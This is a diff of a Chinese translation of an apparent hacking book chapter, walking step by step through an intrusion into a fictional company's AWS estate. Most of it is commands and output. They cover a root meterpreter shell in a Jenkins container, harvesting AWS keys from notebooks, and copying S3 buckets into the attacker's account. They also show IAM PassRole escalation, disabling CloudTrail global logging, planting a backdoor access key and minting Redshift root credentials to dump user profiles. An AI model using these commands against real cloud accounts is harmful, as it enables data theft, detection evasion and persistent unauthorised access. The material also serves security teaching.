@@ -1,6 +1,4 @@
-# 12
-
-Apotheosis
+# Apotheosis
 
 ![](img/chapterart.png)
 
@@ -10,22 +8,22 @@ Apotheosis
 meterpreter > **shell**
 Channel 1 created.
 
-# **id**
+# id
 1 uid=0(root) gid=0(root) groups=0(root)
 
-# **hostname**
+# hostname
 2 e56951c17be0
 ```
 
 我们可以看到，我们以 root 身份 1 运行在一个随机命名的机器 2 上。是的，我们很可能在一个容器内。因此，我们运行了`env`命令来揭示任何注入的机密信息，并运行了`mount`命令来显示主机共享的文件夹和文件。接下来，我们执行了几条查询元数据 API 的命令，请求该机器上附加的 IAM 角色（见列表 12-1）。
 
 ```
-# **env**
+# env
 HOSTNAME=cef681151504
 GOPATH=/go
 PWD=/go
 GOLANG_VERSION=1.13.5
-# **mount**
+# mount
 /dev/mapper/ubuntu--vg-root on /etc/hosts type ext4
 (rw,relatime,errors=remount-ro,data=ordered)
 
@@ -35,8 +33,8 @@ GOLANG_VERSION=1.13.5
 /dev/mapper/ubuntu--vg-root on /usr/bin/docker type ext4
 (rw,relatime,errors=remount-ro,data=ordered)
 
-# **apt install -y curl**
-# **curl 169.254.169.254/latest/meta-data/iam/security-credentials/**
+# apt install -y curl
+# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
 2 ...<title>404 - Not Found</title>...
 ```
 
@@ -47,7 +45,7 @@ GOLANG_VERSION=1.13.5
 我们可以安全地将可能用于通过`curl`直接查询*/var/run/docker.sock*的丑陋 JSON 藏起来，并迅速执行 Docker 命令来枚举当前运行的容器（见列表 12-2）。
 
 ```
-# **docker ps**
+# docker ps
 CONTAINER ID   IMAGE
 1 e56951c17be0   983457354409.dkr.ecr.eu-west-1.amazonaws.com/
                app-abtest:SUP6541-add-feature-network
@@ -67,7 +65,7 @@ CONTAINER ID   IMAGE
 我们或许已经对这台机器上发生的事情有了一些了解，但在得出结论之前，我们仍然需要最后一块信息。让我们使用`docker info`命令获取更多主机信息：
 
 ```
-# **docker info**
+# docker info
 Name: jenkins-slave-4
 Total Memory: 31.859GiB
 Operating System: Ubuntu 16.04.6 LTS
@@ -88,7 +86,7 @@ Running: 12
 测试任务只能持续一段时间，然后被丢弃。让我们通过在一个新的容器上运行自定义的 meterpreter，并将其标记为`aws-cli`，将这种临时访问转变为永久访问：
 
 ```
-# **docker run \**
+# docker run \
 **--privileged \**
 1 **-v /:/hostOS \**
 **-v /var/run/docker.sock:/var/run/docker.sock \**
@@ -485,7 +483,7 @@ root@Point1:~/#  **aws s3api list-objects-v2 \**
 ```
 root@Point1:~/#  **aws s3 sync s3://gretsch-notebooks ./notebooks**
 
-root@Point1:~notebooks/# **grep -R "AKIA" -4 ***
+root@Point1:~notebooks/# grep -R "AKIA" -4 *
 yuka/Conversion_model/...  awsKeyOpt =
 Some(\"AKIAASJACEDYAZYWJJM6D5\"),\n",
 yuka/Conversion_model/...  awsSecretOpt =
@@ -498,7 +496,7 @@ Some(\"3ceq43SGCmTYKkiZkGrF7dr0Lssxdakymtoi14OSQ\")\n",
 让我们也搜索一下在 Spark 中常用的 S3 驱动程序` s3a`和`s3n`的出现情况，揭开一些常用的 S3 存储桶，定期用于加载数据和进行实验：
 
 ```
-root@Point1:~notebooks/# **egrep -R "s3[a|n]://" ***
+root@Point1:~notebooks/# egrep -R "s3[a|n]://" *
 1 s3a://gretsch-finance/portfolio/exports/2019/03/ report1579446047119.csv
 s3a://gretsch-hadoop/engine/aft-perf/...
 s3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...
@@ -509,10 +507,10 @@ s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
 看看第一个存储桶的名称：gretsch-finance 1。这应该会很有趣。我们将使用从同一本笔记本中提取的 AWS 密钥之一，卸载位于*portfolio/exports/2020*下的密钥：
 
 ```
-root@Point1:~/# **aws s3 sync \**
+root@Point1:~/# aws s3 sync \
 **s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1**
 
-root@Point1:~/# **ls exports_20/**
+root@Point1:~/# ls exports_20/
 ./01/report1548892800915.csv
 ./02/report1551319200454.csv
 ./03/report1551578400344.csv
@@ -523,7 +521,7 @@ root@Point1:~/# **ls exports_20/**
 让我们取一个随机文件来查看：
 
 ```
-root@Point1:~/# **head ./03/report1551578400344.csv**
+root@Point1:~/# head ./03/report1551578400344.csv
 annual revenue, last contact, initial contact, country, account,
 zip code, service purchased, ...
 0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...
@@ -541,7 +539,7 @@ zip code, service purchased, ...
 gretsch-finance 存储桶证明是一个成功的目标。让我们检查其余的存储桶：
 
 ```
-root@Point1:~notebooks/# **egrep -R "s3[a|n]://" ***
+root@Point1:~notebooks/# egrep -R "s3[a|n]://" *
 s3a://gretsch-hadoop/engine/aft-perf/...
 s3a://gretsch-hadoop-us1/nj/dmp/thirdparty/segments/...
 s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
@@ -551,7 +549,7 @@ s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
 配置文件、社交、细分等。文件名很有吸引力。这很可能就是我们要找的用户数据。注意，gretsch-hadoop-us1 存储桶的名称暗示了区域化分区。到底有多少个区域，也就有多少个 Hadoop 存储桶？
 
 ```
-root@Point1:~/# **aws s3api list-buckets \**
+root@Point1:~/# aws s3api list-buckets \
 **--profile data1 \**
 **--query "Buckets[].Name"\| grep Hadoop**
 
@@ -563,7 +561,7 @@ gretsch-hadoop-apse1
 我们为每个三个 AWS 区域（北加州、爱尔兰和新加坡）找到了一个 Hadoop 存储桶。我们从 gretsch-hadoop-usw1 下载了 1,000 个文件，以查看它包含哪些类型的文件：
 
 ```
-root@Point1:~/# **aws s3api list-objects-v2 \**
+root@Point1:~/# aws s3api list-objects-v2 \
 **--profile data1 \**
 **--bucket=gretsch-hadoop-usw1 \**
 **--max-items 1000**
@@ -578,8 +576,8 @@ root@Point1:~/# **aws s3api list-objects-v2 \**
 我们安装了必要的工具来解压和操作*.parquet*文件，然后打开几个随机文件：
 
 ```
-root@Point1:~/# **python -m pip install parquet-cli**
-root@Point1:~/# **parq 02/user_sessions_stats.parquet -head 100**
+root@Point1:~/# python -m pip install parquet-cli
+root@Point1:~/# parq 02/user_sessions_stats.parquet -head 100
 userid = c9e2b1905962fa0b344301540e615b628b4b2c9f
 interest_segment = 4878647678
 ts = 1557900000
@@ -589,13 +587,13 @@ last_provider = 34
 ip.geo.x = 52.31.46.2
 `--snip--`
 
-root@Point1:~/# **parq 03/perf_stats.parquet -head 100**
+root@Point1:~/# parq 03/perf_stats.parquet -head 100
 click = 2
 referrer = 9735842
 deviceUID = 03108db-65f2-4d7c-b884-bb908d111400
 `--snip--`
 
-root@Point1:~/# **parq 03/social_stats.parquet -head 100**
+root@Point1:~/# parq 03/social_stats.parquet -head 100
 social_segment = 61895815510
 fb_profile = 3232698
 insta_profile = 987615915
@@ -608,9 +606,9 @@ pinterest_profile = 57928
 我们可以在自己的机器上配置几个 TB 的存储空间，接着完全窃取这三个桶。相反，我们只是指示 AWS 将桶复制到我们自己的账户中，但首先需要稍作调整以加快速度：
 
 ```
-root@Point1:~/# **aws configure set default.s3.max_concurrent_requests 1000**
-root@Point1:~/# **aws configure set default.s3.max_queue_size 100000**
-root@Point1:~/# **aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop**
+root@Point1:~/# aws configure set default.s3.max_concurrent_requests 1000
+root@Point1:~/# aws configure set default.s3.max_queue_size 100000
+root@Point1:~/# aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop
 ```
 
 我们拥有来自三个 Hadoop 桶的所有数据。不过，不要太激动；这些数据几乎不可能在没有大量探索、业务知识和当然的计算能力下处理。老实说，我们完全超出了自己的能力范围。
@@ -624,7 +622,7 @@ Gretsch Politico 每天都由其数据专家小队进行这种处理。我们难
 问题是，GP 将其丰富和处理过的数据存储在哪里？最快的方式是搜索 Jupyter 笔记本，查找有关分析工具的提示、SQL 类查询、图表和仪表盘等内容（参见列表 12-9）。
 
 ```
-root@Point1:~notebooks/# **egrep -R -5 "sql|warehouse|snowflake|redshift|bigquery" ***
+root@Point1:~notebooks/# egrep -R -5 "sql|warehouse|snowflake|redshift|bigquery" *
 
 redshift_endpoint = "sandbox.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com"
 
@@ -648,7 +646,7 @@ Redshift 以其显著的速度、可扩展性、并行上传能力以及与 AWS 
 不幸的是，我们获取的凭证属于一个包含无关数据的沙箱数据库。而且，我们的 AWS 访问密钥都不能直接查询 Redshift API：
 
 ```
-root@Point1:~/# **aws redshift describe-clusters \**
+root@Point1:~/# aws redshift describe-clusters \
 **--profile=data1 \**
 **--region eu-west-1**
 
@@ -662,13 +660,13 @@ An error occurred (AccessDenied) when calling the DescribeClusters...
 通过检查我们获得的十二个 IAM 访问密钥，我们意识到它们都属于同一个 IAM 组，因此共享相同的基本权限——也就是，读取/写入一些桶，并附带一些轻量的只读 IAM 权限：
 
 ```
-root@Point1:~/# **aws iam list-groups --profile=leslie**
+root@Point1:~/# aws iam list-groups --profile=leslie
 "GroupName": "spark-s3",
 
-root@Point1:~/# **aws iam list-groups --profile=marc**
+root@Point1:~/# aws iam list-groups --profile=marc
 "GroupName": "spark-s3",
 
-root@Point1:~/# **aws iam list-groups --profile=camellia**
+root@Point1:~/# aws iam list-groups --profile=camellia
 "GroupName": "spark-debug",
 "GroupName": "spark-s3",
 
@@ -678,7 +676,7 @@ root@Point1:~/# **aws iam list-groups --profile=camellia**
 等一下。Camellia 属于一个名为 *spark-debug* 的附加组。让我们仔细看看这个组所附加的策略：
 
 ```
-root@Point1:~/# **aws iam list-attach-group-policies --group-name spark-debug --profile=camellia**
+root@Point1:~/# aws iam list-attach-group-policies --group-name spark-debug --profile=camellia
 
 "PolicyName": "AmazonEC2FullAccess",
 "PolicyName": "iam-pass-role-spark",
@@ -690,14 +688,14 @@ root@Point1:~/# **aws iam list-attach-group-policies --group-name spark-debug --
 
 ```
 # get policy version
-root@Point1:~/# **aws iam get-policy \**
+root@Point1:~/# aws iam get-policy \
 **--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \**
 **--profile camellia**
 
 "DefaultVersionId": "v1",
 
 # get policy content
-root@Point1:~/# **aws iam get-policy-version \**
+root@Point1:~/# aws iam get-policy-version \
 **--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \**
 **--version v1 \**
 **--profile camellia**
@@ -712,7 +710,7 @@ GP 可能没有完全意识到，但通过 IAM 的`PassRole`操作，他们已�
 让我们探讨一下作为 Camellia 的我们可以传递给 EC2 实例的角色选项。唯一的限制是该角色需要在其信任策略中包含*ec2.amazonaws.com*：
 
 ```
-root@Point1:~/# **aws iam list-roles --profile camellia \**
+root@Point1:~/# aws iam list-roles --profile camellia \
 **| jq -r '.Roles[] | .RoleName + ", " + \**
 **.AssumeRolePolicyDocument.Statement[].Principal.Service' \**
 **| grep "ec2.amazonaws.com"**
@@ -726,20 +724,20 @@ spark-master, ec2.amazonaws.com
 在这些角色中，我们看到了 rundeck，这可能就是我们期待的救世主。Rundeck 是一个自动化工具，用于在基础设施上运行管理员脚本。GP 的基础设施团队似乎并不热衷于使用 Jenkins，因此他们可能将大部分工作负载调度到了 Rundeck 上。让我们使用 Camellia 来查看 rundeck 拥有哪些权限：
 
 ```
-root@Point1:~/# **aws iam get-attached-role-policies \**
+root@Point1:~/# aws iam get-attached-role-policies \
 **--role-name rundeck \**
 **--profile camellia**
 
 "PolicyName": "rundeck-mono-policy",
 
 # get policy version
-root@Point1:~/# **aws iam get-policy --profile camellia \**
+root@Point1:~/# aws iam get-policy --profile camellia \
 **--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy**
 
 "DefaultVersionId": "v13",
 
 # get policy content
-root@Point1:~/# **aws iam get-policy-version \**
+root@Point1:~/# aws iam get-policy-version \
 **--version v13 \**
 **--profile camellia \**
 **--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy**
@@ -754,7 +752,7 @@ root@Point1:~/# **aws iam get-policy-version \**
 因此，计划是在与 Spark 集群相同的子网中启动一个实例。我们小心地复制相同的属性，以便在明面上隐藏：安全组、标签，所有内容。我们正在查找这些属性，以便稍后模仿它们：
 
 ```
-root@Point1:~/# **aws ec2 describe-instances --profile camellia \**
+root@Point1:~/# aws ec2 describe-instances --profile camellia \
 **--filters 'Name=tag:Name,Values=*spark*'**
 
 `--snip--`
@@ -772,7 +770,7 @@ root@Point1:~/# **aws ec2 describe-instances --profile camellia \**
 我们确切知道 Spark 工作节点可以通过 443 端口访问互联网，因此我们懒得重新验证刚刚确认的安全组，直接复制并粘贴这些安全组，并使用 rundeck 配置文件启动一个新实例：
 
 ```
-root@Point1:~/# **aws ec2 run-instances \**
+root@Point1:~/# aws ec2 run-instances \
 **--image-id ami-02df9ea15c1778c9c \**
 **--count 1 \**
 **--instance-type m3.medium \**
@@ -813,9 +811,9 @@ meterpreter > **execute -i -H -f curl -a \**
 太棒了！我们得到了属于 rundeck 角色的一堆顶级安全密钥和令牌。现在我们有了这些密钥，让我们查询可能暴露的经典服务，看看哪些是活跃的（CloudTrail、GuardDuty 和 Access Analyzer）：
 
 ```
-root@Point1:~/# **export AWS_PROFILE=rundeck**
-root@Point1:~/# **export AWS_REGION=eu-west-1**
-root@Point1:~/# **aws cloudtrail describe-trails**
+root@Point1:~/# export AWS_PROFILE=rundeck
+root@Point1:~/# export AWS_REGION=eu-west-1
+root@Point1:~/# aws cloudtrail describe-trails
 
    "Name": "aggregated",
    "S3BucketName": "gretsch-aggreg-logs",
@@ -824,10 +822,10 @@ root@Point1:~/# **aws cloudtrail describe-trails**
    "HomeRegion": "eu-west-1",
  1"HasInsightSelectors": false,
 
-root@Point1:~/# **aws guardduty list-detectors**
+root@Point1:~/# aws guardduty list-detectors
 "DetectorIds": []
 
-root@Point1:~/# **aws accessanalyzer list-analyzers**
+root@Point1:~/# aws accessanalyzer list-analyzers
 "analyzers": []
 ```
 
@@ -836,18 +834,18 @@ root@Point1:~/# **aws accessanalyzer list-analyzers**
 让我们暂时盲目地隐藏日志轨迹，并向 Camellia 的用户账户中插入一个访问密钥，以增强我们的持久性。如果我们想重新获得对 GP 账户的访问，她的权限完全足够：
 
 ```
-root@Point1:~/# **aws cloudtrail update-trail \**
+root@Point1:~/# aws cloudtrail update-trail \
 **--name aggregated \**
 **--no-include-global-service-events \**
 **--no-is-multi-region**
 
-root@Point1:~/# **aws iam list-access-keys --user-name camellia**
+root@Point1:~/# aws iam list-access-keys --user-name camellia
 
 "AccessKeyId": "AKIA44ZRK6WSXNQGVUX7",
 "Status": "Active",
 "CreateDate": "2019-12-13T18:26:17Z"
 
-root@Point1:~/# **aws iam create-access-key --user-name camellia**
+root@Point1:~/# aws iam create-access-key --user-name camellia
 {
     "AccessKey": {
         "UserName": "camellia",
@@ -861,7 +859,7 @@ root@Point1:~/# **aws iam create-access-key --user-name camellia**
 三十分钟后，我们清理了 EC2 实例并重新启用了 CloudTrail 多区域日志记录：
 
 ```
-root@Point1:~/# **aws cloudtrail update-trail \**
+root@Point1:~/# aws cloudtrail update-trail \
 **--name aggregated \**
 **--include-global-service-events \**
 **--is-multi-region**
@@ -874,7 +872,7 @@ root@Point1:~/# **aws cloudtrail update-trail \**
 现在我们已经获得了 GP 的 AWS 账户访问权限，让我们探索它的 Redshift 集群（见 Listing 12-10）。毕竟，这就是我们接管该账户的主要动机。
 
 ```
-root@Point1:~/# **aws redshift describe-clusters**
+root@Point1:~/# aws redshift describe-clusters
 "Clusters": 
 1 ClusterIdentifier: bi,
     NodeType: ra3.16xlarge, NumberOfNodes: 10,
@@ -920,7 +918,7 @@ VpcSecurityGroupId: sg-9f3a64e4, sg-a53f61de, sg-042c4a3f80a7e262c
 我们查看安全组，以便检查是否有过滤规则阻止直接连接到数据库：
 
 ```
-root@Point1:~/# **aws ec2 describe-security-groups \**
+root@Point1:~/# aws ec2 describe-security-groups \
 **--group-ids sg-9f3a64e4 sg-a53f61de**
 
 "IpPermissions": [ {
@@ -938,7 +936,7 @@ root@Point1:~/# **aws ec2 describe-security-groups \**
 Redshift 与 IAM 服务紧密结合，我们不需要去寻找数据库的凭证。由于我们在 rundeck 角色上有一个漂亮的`redshift:*`权限，我们只需为任何数据库用户账户（包括 root）创建一个临时密码：
 
 ```
-root@Point1:~/# **aws get-cluster-credentials \**
+root@Point1:~/# aws get-cluster-credentials \
 **--db-user root \**
 **--db-name datalake\**
 **--cluster-identifier bi \**
@@ -952,8 +950,8 @@ root@Point1:~/# **aws get-cluster-credentials \**
 使用这些数据库凭证，我们只需下载 PostgreSQL 客户端并将其指向 Redshift 端点：
 
 ```
-root@Point1:~/# **apt install postgresql postgresql-contrib**
-root@Point1:~/# **PGPASSWORD='AskFx8eXi0nlkMLKIx...' \**
+root@Point1:~/# apt install postgresql postgresql-contrib
+root@Point1:~/# PGPASSWORD='AskFx8eXi0nlkMLKIx...' \
 **psql \**
 **-h bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com \**
 **-U root \**
@@ -966,7 +964,7 @@ root@Point1:~/# **PGPASSWORD='AskFx8eXi0nlkMLKIx...' \**
 我们导出了包含表和列的全面列表（存储在`PG_TABLE_DEF`表中），并迅速锁定了有趣的数据：
 
 ```
-root@Point1:~/# **cat list_tables_columns.txt**
+root@Point1:~/# cat list_tables_columns.txt
 profile, id
 profile, name
 profile, lastname
